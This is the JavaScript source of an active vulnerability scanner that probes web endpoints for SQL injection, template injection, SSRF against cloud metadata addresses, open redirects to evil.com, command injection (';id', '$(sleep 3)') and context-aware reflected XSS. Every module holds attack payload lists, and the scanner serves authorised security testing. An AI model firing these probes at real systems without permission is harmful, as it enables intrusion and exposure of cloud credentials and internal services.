/**
 * Active Injection Scanner
 *
 * Probes for common injection vulnerabilities:
 *   - SQL injection (error-based + time-based blind)
 *   - Server-Side Template Injection (SSTI)
 *   - Server-Side Request Forgery (SSRF)
 *   - Open redirect
 *   - Command injection
 *
 * Techniques borrowed from:
 *   - Dalfox — context-aware XSS (analyze reflection, then target)
 *   - Wapiti — error pattern matching for SQLi
 *   - Nuclei — pattern-based detection
 *   - Burp Suite — time-based blind SQLi
 *
 * WARNING: These probes send attack payloads to the target.
 * Only use against targets you have permission to test.
 */

const INJECT_TIMEOUT = 10_000;

async function safeFetch(url, opts = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), opts.timeout || INJECT_TIMEOUT);
  const start = Date.now();
  try {
    const res = await fetch(url, { ...opts, signal: controller.signal, redirect: "manual" });
    const elapsed = Date.now() - start;
    const body = await res.text().catch(() => "");
    return { status: res.status, body, headers: Object.fromEntries(res.headers.entries()), elapsed, ok: true };
  } catch {
    return { status: 0, body: "", headers: {}, elapsed: Date.now() - start, ok: false };
  } finally {
    clearTimeout(timeout);
  }
}

// ── SQL Injection Detection ──────────────────────────────────────────────

const SQLI_ERROR_PATTERNS = [
  { re: /SQL syntax.*?MySQL/i, db: "MySQL" },
  { re: /Warning.*?\Wmysqli?_/i, db: "MySQL" },
  { re: /valid MySQL result/i, db: "MySQL" },
  { re: /PostgreSQL.*?ERROR/i, db: "PostgreSQL" },
  { re: /Warning.*?\Wpg_/i, db: "PostgreSQL" },
  { re: /unterminated quoted string/i, db: "PostgreSQL" },
  { re: /ORA-\d{5}/i, db: "Oracle" },
  { re: /Microsoft.*?ODBC.*?Driver/i, db: "MSSQL" },
  { re: /Unclosed quotation mark/i, db: "MSSQL" },
  { re: /Microsoft.*?SQL.*?Server/i, db: "MSSQL" },
  { re: /\bSQLite.*?(?:error|warning)\b/i, db: "SQLite" },
  { re: /SQLSTATE\[/i, db: "PDO" },
  { re: /DB2 SQL error/i, db: "DB2" },
  { re: /Sybase message/i, db: "Sybase" },
  { re: /Syntax error.*?in query expression/i, db: "MSAccess" },
  { re: /Data type mismatch/i, db: "Generic" },
  { re: /Division by zero/i, db: "Generic" },
];

const SQLI_PAYLOADS = [
  "'",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "\" OR \"1\"=\"1",
  "1' AND '1'='2",
  "1 UNION SELECT NULL--",
  "'; WAITFOR DELAY '0:0:5'--",       // MSSQL time-based
  "' AND SLEEP(5)--",                  // MySQL time-based
  "'; SELECT pg_sleep(5)--",           // PostgreSQL time-based
];

/**
 * Test an endpoint for SQL injection.
 *
 * @param {string} baseUrl
 * @param {string} path - Endpoint path
 * @param {object} opts - { method, paramName }
 * @returns {object[]} Findings
 */
export async function probeSqli(baseUrl, path, opts = {}) {
  const findings = [];
  const method = opts.method || "GET";

  // Get baseline response
  const baseline = await safeFetch(`${baseUrl}${path}`, { method });
  if (!baseline.ok) return findings;

  for (const payload of SQLI_PAYLOADS.slice(0, 5)) {
    let res;
    if (method === "GET") {
      // Inject into query parameter
      const sep = path.includes("?") ? "&" : "?";
      res = await safeFetch(`${baseUrl}${path}${sep}id=${encodeURIComponent(payload)}`, { method });
    } else {
      res = await safeFetch(`${baseUrl}${path}`, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: payload, query: payload }),
      });
    }

    if (!res.ok) continue;

    // Check for error-based SQLi
    for (const { re, db } of SQLI_ERROR_PATTERNS) {
      if (re.test(res.body) && !re.test(baseline.body)) {
        findings.push({
          severity: "critical",
          title: `SQL injection (error-based, ${db})`,
          description: `Payload: ${payload} triggered ${db} error`,
          url: `${baseUrl}${path}`,
          status: res.status,
          category: "sqli",
          source: "injection-probe",
        });
        return findings; // One confirmed SQLi is enough
      }
    }
  }

  // Time-based blind SQLi (test with sleep payloads)
  const timingPayloads = [
    { payload: "' AND SLEEP(3)--", db: "MySQL" },
    { payload: "'; SELECT pg_sleep(3)--", db: "PostgreSQL" },
  ];

  for (const { payload, db } of timingPayloads) {
    let res;
    if (method === "GET") {
      const sep = path.includes("?") ? "&" : "?";
      res = await safeFetch(`${baseUrl}${path}${sep}id=${encodeURIComponent(payload)}`, {
        method,
        timeout: 8_000,
      });
    } else {
      res = await safeFetch(`${baseUrl}${path}`, {
        method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: payload }),
        timeout: 8_000,
      });
    }

    // If response took significantly longer than baseline, possible blind SQLi
    if (res.elapsed > baseline.elapsed + 2500 && res.elapsed > 3000) {
      findings.push({
        severity: "high",
        title: `Possible blind SQL injection (time-based, ${db})`,
        description: `Payload: ${payload} — response took ${res.elapsed}ms vs baseline ${baseline.elapsed}ms`,
        url: `${baseUrl}${path}`,
        status: res.status,
        category: "sqli",
        source: "injection-probe",
      });
    }
  }

  return findings;
}

// ── Server-Side Template Injection (SSTI) ────────────────────────────────

const SSTI_PROBES = [
  { payload: "{{7*7}}", expect: "49", engine: "Jinja2/Twig/Handlebars" },
  { payload: "${7*7}", expect: "49", engine: "Freemarker/Velocity/EL" },
  { payload: "#{7*7}", expect: "49", engine: "Thymeleaf/Ruby ERB" },
  { payload: "<%= 7*7 %>", expect: "49", engine: "ERB/EJS" },
  { payload: "${{7*7}}", expect: "49", engine: "AngularJS/Vue" },
  { payload: "{{constructor.constructor('return 7*7')()}}", expect: "49", engine: "Handlebars sandbox escape" },
];

/**
 * Test an endpoint for SSTI.
 */
export async function probeSsti(baseUrl, path, opts = {}) {
  const findings = [];

  for (const { payload, expect, engine } of SSTI_PROBES) {
    // Try injecting via query param
    const sep = path.includes("?") ? "&" : "?";
    const res = await safeFetch(
      `${baseUrl}${path}${sep}name=${encodeURIComponent(payload)}`,
    );

    if (res.ok && res.body.includes(expect) && !res.body.includes(payload)) {
      findings.push({
        severity: "critical",
        title: `Server-Side Template Injection (${engine})`,
        description: `Payload "${payload}" evaluated to "${expect}" in response`,
        url: `${baseUrl}${path}`,
        status: res.status,
        category: "ssti",
        source: "injection-probe",
      });
      return findings; // Confirmed SSTI
    }

    // Also try POST body
    const postRes = await safeFetch(`${baseUrl}${path}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: payload, input: payload, query: payload }),
    });

    if (postRes.ok && postRes.body.includes(expect) && !postRes.body.includes(payload)) {
      findings.push({
        severity: "critical",
        title: `Server-Side Template Injection (${engine})`,
        description: `POST payload "${payload}" evaluated to "${expect}"`,
        url: `${baseUrl}${path}`,
        status: postRes.status,
        category: "ssti",
        source: "injection-probe",
      });
      return findings;
    }
  }

  return findings;
}

// ── Server-Side Request Forgery (SSRF) ───────────────────────────────────

const SSRF_TARGETS = [
  { url: "http://169.254.169.254/latest/meta-data/", name: "AWS metadata" },
  { url: "http://metadata.google.internal/computeMetadata/v1/", name: "GCP metadata" },
  { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", name: "Azure metadata" },
  { url: "http://127.0.0.1:80/", name: "localhost" },
  { url: "http://[::1]:80/", name: "IPv6 localhost" },
  { url: "http://0.0.0.0:80/", name: "0.0.0.0" },
  { url: "http://localhost:22/", name: "localhost SSH" },
];

/**
 * Test an endpoint for SSRF via URL parameters.
 */
export async function probeSsrf(baseUrl, path, opts = {}) {
  const findings = [];

  // Identify URL-like parameters in the path or common parameter names
  const urlParams = ["url", "link", "href", "src", "redirect", "callback", "return", "next", "target", "dest", "fetch", "proxy"];

  for (const param of urlParams.slice(0, 5)) {
    for (const { url: ssrfTarget, name } of SSRF_TARGETS.slice(0, 3)) {
      const sep = path.includes("?") ? "&" : "?";
      const res = await safeFetch(
        `${baseUrl}${path}${sep}${param}=${encodeURIComponent(ssrfTarget)}`,
      );

      if (!res.ok) continue;

      // Check if the response contains metadata indicators
      const metadataIndicators = [
        /ami-id/i, /instance-id/i, /iam/i,                    // AWS
        /computeMetadata/i, /project-id/i,                     // GCP
        /subscriptionId/i, /resourceGroupName/i,               // Azure
        /root:.*:0:0/,                                          // /etc/passwd
      ];

      for (const pattern of metadataIndicators) {
        if (pattern.test(res.body)) {
          findings.push({
            severity: "critical",
            title: `SSRF — ${name} accessible via ?${param}=`,
            description: `Internal resource accessed through URL parameter`,
            url: `${baseUrl}${path}?${param}=${ssrfTarget}`,
            status: res.status,
            category: "ssrf",
            source: "injection-probe",
          });
          return findings;
        }
      }
    }
  }

  return findings;
}

// ── Open Redirect ────────────────────────────────────────────────────────

const REDIRECT_PAYLOADS = [
  "https://evil.com",
  "//evil.com",
  "/\\evil.com",
  "https://evil.com%2F%2F",
  "////evil.com",
  "https:evil.com",
];

/**
 * Test an endpoint for open redirect.
 */
export async function probeOpenRedirect(baseUrl, path, opts = {}) {
  const findings = [];
  const redirectParams = ["redirect", "redirect_uri", "return", "return_to", "next", "url", "callback", "redir", "destination", "go"];

  for (const param of redirectParams) {
    for (const payload of REDIRECT_PAYLOADS.slice(0, 3)) {
      const sep = path.includes("?") ? "&" : "?";
      const res = await safeFetch(
        `${baseUrl}${path}${sep}${param}=${encodeURIComponent(payload)}`,
        { timeout: 5_000 },
      );

      if (!res.ok) continue;

      // Check if response redirects to evil domain
      const location = res.headers.location || "";
      if (location.includes("evil.com")) {
        findings.push({
          severity: "medium",
          title: `Open redirect via ?${param}=`,
          description: `Redirects to ${location}`,
          url: `${baseUrl}${path}?${param}=${payload}`,
          status: res.status,
          category: "open-redirect",
          source: "injection-probe",
        });
        return findings;
      }
    }
  }

  return findings;
}

// ── Command Injection ────────────────────────────────────────────────────

const CMDI_PAYLOADS = [
  { payload: ";sleep 3", timing: true },
  { payload: "|sleep 3", timing: true },
  { payload: "$(sleep 3)", timing: true },
  { payload: "`sleep 3`", timing: true },
  { payload: ";id", pattern: /uid=\d+/ },
  { payload: "|id", pattern: /uid=\d+/ },
];

/**
 * Test an endpoint for OS command injection.
 */
export async function probeCmdi(baseUrl, path, opts = {}) {
  const findings = [];
  const method = opts.method || "POST";

  // Get baseline timing
  const baseline = await safeFetch(`${baseUrl}${path}`, {
    method,
    headers: { "Content-Type": "application/json" },
    body: method === "POST" ? JSON.stringify({ input: "safe" }) : undefined,
  });

  for (const { payload, timing, pattern } of CMDI_PAYLOADS) {
    const res = await safeFetch(`${baseUrl}${path}`, {
      method,
      headers: { "Content-Type": "application/json" },
      body: method === "POST" ? JSON.stringify({ input: payload, cmd: payload, command: payload }) : undefined,
      timeout: timing ? 8_000 : INJECT_TIMEOUT,
    });

    if (!res.ok) continue;

    if (pattern && pattern.test(res.body)) {
      findings.push({
        severity: "critical",
        title: "OS command injection",
        description: `Payload "${payload}" returned system output`,
        url: `${baseUrl}${path}`,
        status: res.status,
        category: "cmdi",
        source: "injection-probe",
      });
      return findings;
    }

    if (timing && res.elapsed > baseline.elapsed + 2500 && res.elapsed > 3000) {
      findings.push({
        severity: "high",
        title: "Possible OS command injection (time-based)",
        description: `Payload "${payload}" — ${res.elapsed}ms vs baseline ${baseline.elapsed}ms`,
        url: `${baseUrl}${path}`,
        status: res.status,
        category: "cmdi",
        source: "injection-probe",
      });
      return findings;
    }
  }

  return findings;
}

// ── Context-Aware XSS (Dalfox-style) ────────────────────────────────────

const CANARY = "pnth3r4xss";

/**
 * Test an endpoint for reflected XSS using context-aware payload generation.
 *
 * Algorithm (inspired by Dalfox):
 *   1. Send a unique canary string
 *   2. Find where it's reflected in the HTML response
 *   3. Determine the injection context (tag content, attribute, JS block, etc.)
 *   4. Generate a minimal, targeted payload for that context
 *   5. Verify the payload is reflected unescaped
 */
export async function probeXss(baseUrl, path, opts = {}) {
  const findings = [];
  const inputParams = ["q", "search", "query", "name", "input", "text", "value", "msg", "error", "redirect", "url", "id"];

  for (const param of inputParams) {
    // Step 1: Send canary
    const sep = path.includes("?") ? "&" : "?";
    const canaryUrl = `${baseUrl}${path}${sep}${param}=${CANARY}`;
    const canaryRes = await safeFetch(canaryUrl);
    if (!canaryRes.ok || !canaryRes.body.includes(CANARY)) continue;

    // Step 2: Determine injection context
    const context = analyzeReflectionContext(canaryRes.body, CANARY);
    if (!context) continue;

    // Step 3: Generate targeted payloads
    const payloads = getPayloadsForContext(context);

    // Step 4: Test each payload
    for (const { payload, check } of payloads) {
      const attackUrl = `${baseUrl}${path}${sep}${param}=${encodeURIComponent(payload)}`;
      const attackRes = await safeFetch(attackUrl);
      if (!attackRes.ok) continue;

      // Step 5: Verify unescaped reflection
      if (check(attackRes.body)) {
        findings.push({
          severity: "high",
          title: `Reflected XSS via ?${param}= (${context.type} context)`,
          description: `Payload: ${payload.slice(0, 80)}`,
          url: attackUrl,
          status: attackRes.status,
          category: "xss",
          source: "injection-probe",
        });
        return findings; // One confirmed XSS per endpoint is enough
      }
    }
  }

  // Also try POST body injection
  const postRes = await safeFetch(`${baseUrl}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: CANARY, input: CANARY, query: CANARY }),
  });

  if (postRes.ok && postRes.body.includes(CANARY)) {
    const context = analyzeReflectionContext(postRes.body, CANARY);
    if (context) {
      const payloads = getPayloadsForContext(context);
      for (const { payload, check } of payloads) {
        const attackRes = await safeFetch(`${baseUrl}${path}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name: payload, input: payload, query: payload }),
        });
        if (attackRes.ok && check(attackRes.body)) {
          findings.push({
            severity: "high",
            title: `Reflected XSS via POST body (${context.type} context)`,
            description: `Payload: ${payload.slice(0, 80)}`,
            url: `${baseUrl}${path}`,
            status: attackRes.status,
            category: "xss",
            source: "injection-probe",
          });
          return findings;
        }
      }
    }
  }

  return findings;
}

/**
 * Analyze WHERE the canary appears in the HTML response.
 * Returns the injection context type.
 */
function analyzeReflectionContext(html, canary) {
  const idx = html.indexOf(canary);
  if (idx === -1) return null;

  // Look at surrounding context (200 chars before and after)
  const before = html.slice(Math.max(0, idx - 200), idx);
  const after = html.slice(idx + canary.length, idx + canary.length + 200);

  // Inside a quoted attribute: <tag attr="...CANARY..."
  if (/=["'][^"']*$/.test(before)) {
    const quote = before.match(/=(['"])[^'"]*$/)?.[1] || '"';
    return { type: "attribute", quote, before, after };
  }

  // Inside a <script> block: var x = "CANARY"
  if (/<script[\s>][^]*$/i.test(before) && !/<\/script>/i.test(before.slice(-50))) {
    // Inside a JS string?
    const jsQuote = before.match(/['"`][^'"`]*$/)?.[0]?.[0];
    return { type: "javascript", quote: jsQuote || null, before, after };
  }

  // Inside a <style> block
  if (/<style[\s>][^]*$/i.test(before) && !/<\/style>/i.test(before.slice(-50))) {
    return { type: "style", before, after };
  }

  // Inside an HTML comment: <!-- CANARY -->
  if (/<!--[^]*$/.test(before) && !/--%>/.test(before.slice(-10))) {
    return { type: "comment", before, after };
  }

  // Inside a tag but outside attributes: <tag CANARY
  if (/<\w+\s[^>]*$/.test(before)) {
    return { type: "tag-body", before, after };
  }

  // Between tags (tag content): <div>CANARY</div>
  return { type: "html-content", before, after };
}

/**
 * Generate targeted payloads for a specific injection context.
 */
function getPayloadsForContext(context) {
  switch (context.type) {
    case "html-content":
      return [
        { payload: '<img src=x onerror=alert(1)>', check: (b) => b.includes('<img src=x onerror=') },
        { payload: '<svg onload=alert(1)>', check: (b) => b.includes('<svg onload=') },
        { payload: '<details open ontoggle=alert(1)>', check: (b) => b.includes('<details open ontoggle=') },
      ];

    case "attribute":
      return [
        { payload: `${context.quote}><img src=x onerror=alert(1)>`, check: (b) => b.includes('onerror=alert(1)') },
        { payload: `${context.quote} onmouseover=alert(1) ${context.quote}`, check: (b) => b.includes('onmouseover=alert(1)') },
        { payload: `${context.quote} onfocus=alert(1) autofocus ${context.quote}`, check: (b) => b.includes('onfocus=alert(1)') },
      ];

    case "javascript":
      if (context.quote) {
        return [
          { payload: `${context.quote};alert(1);//`, check: (b) => /['"`;]\s*alert\(1\)/.test(b) },
          { payload: `${context.quote}-alert(1)-${context.quote}`, check: (b) => b.includes('-alert(1)-') },
        ];
      }
      return [
        { payload: ';alert(1);//', check: (b) => b.includes(';alert(1);') },
        { payload: '</script><img src=x onerror=alert(1)>', check: (b) => b.includes('onerror=alert(1)') },
      ];

    case "comment":
      return [
        { payload: '--><img src=x onerror=alert(1)><!--', check: (b) => b.includes('onerror=alert(1)') },
      ];

    case "tag-body":
      return [
        { payload: 'onmouseover=alert(1)', check: (b) => b.includes('onmouseover=alert(1)') },
        { payload: 'onfocus=alert(1) autofocus', check: (b) => b.includes('onfocus=alert(1)') },
      ];

    case "style":
      return [
        { payload: '</style><img src=x onerror=alert(1)>', check: (b) => b.includes('onerror=alert(1)') },
      ];

    default:
      return [
        { payload: '<img src=x onerror=alert(1)>', check: (b) => b.includes('<img src=x onerror=') },
      ];
  }
}

// ── Aggregate: Run all injection probes ──────────────────────────────────

/**
 * Run all injection probes against discovered endpoints.
 *
 * @param {string} baseUrl
 * @param {Array<{ path, status }>} endpoints - Discovered endpoints
 * @param {object} opts - { onPhase, maxEndpoints }
 * @returns {object[]} All findings
 */
export async function runInjectionProbes(baseUrl, endpoints, opts = {}) {
  const progress = opts.onPhase || (() => {});
  const max = opts.maxEndpoints || 10;
  const findings = [];

  // Select candidate endpoints (prioritize API routes, non-404)
  const candidates = endpoints
    .filter((ep) => ep.status !== 404 && (ep.path.includes("/api/") || ep.path.includes("?")))
    .slice(0, max);

  if (candidates.length === 0) return findings;

  progress(`Testing ${candidates.length} endpoints for SQLi...`);
  for (const ep of candidates.slice(0, 5)) {
    findings.push(...await probeSqli(baseUrl, ep.path));
  }

  progress(`Testing ${candidates.length} endpoints for SSTI...`);
  for (const ep of candidates.slice(0, 5)) {
    findings.push(...await probeSsti(baseUrl, ep.path));
  }

  progress(`Testing for SSRF via URL parameters...`);
  for (const ep of candidates.slice(0, 3)) {
    findings.push(...await probeSsrf(baseUrl, ep.path));
  }

  progress(`Testing for open redirects...`);
  for (const ep of candidates) {
    findings.push(...await probeOpenRedirect(baseUrl, ep.path));
  }

  progress(`Testing for command injection...`);
  const postEndpoints = candidates.filter((ep) =>
    ep.path.includes("/api/") && !ep.path.includes("/auth/"),
  );
  for (const ep of postEndpoints.slice(0, 3)) {
    findings.push(...await probeCmdi(baseUrl, ep.path));
  }

  progress(`Testing for reflected XSS (context-aware)...`);
  for (const ep of candidates.slice(0, 5)) {
    findings.push(...await probeXss(baseUrl, ep.path));
  }

  return findings;
}
